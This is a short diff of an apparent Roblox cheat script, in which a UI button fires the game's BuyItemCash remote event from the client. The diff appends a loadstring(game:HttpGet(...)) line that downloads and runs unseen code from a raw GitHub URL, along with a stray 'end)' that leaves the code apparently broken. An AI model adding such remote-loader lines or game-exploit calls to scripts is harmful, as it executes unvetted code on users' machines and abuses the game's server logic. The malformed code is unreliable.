@@ -9,3 +9,5 @@ end) Section:NewButton("Buy A", "Buy A", function() local args = { [1] = "A" }
 
 game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kahsiahausu/xxxxxx/main/Kakashiggh"))()
+end)
